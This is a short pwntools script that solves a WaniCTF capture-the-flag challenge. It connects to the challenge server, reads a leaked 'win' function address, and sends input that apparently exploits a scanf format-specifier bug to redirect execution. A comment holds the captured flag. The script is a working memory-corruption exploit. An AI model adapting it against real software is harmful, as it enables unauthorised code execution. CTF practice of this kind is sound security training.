from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('chall')
r= e.process()
r = remote('chal-lz56g6.wanictf.org', 9004)
# lib = e.libc

r.recvuntil(b"= 0x")
win = int(r.recv(12),16) 
log.info("win: %#x" %win)
ret=win+40

for i in range(3):
    r.sendline(b"1")
    r.sendline(b"1")
    r.sendline(b"1")
pause()
r.sendline(flat(ret, win))
r.sendline(b"-")
r.sendline(b"-")

r.recvuntil(b"Excellent!\n")
print(r.recv(100))
# r.sendlineafter(b"ingredient 1: ", payload)
r.interactive()

# FLAG{B3_c4r3fu1_wh3n_using_th3_f0rm4t_sp3cifi3r_1f_in_sc4nf}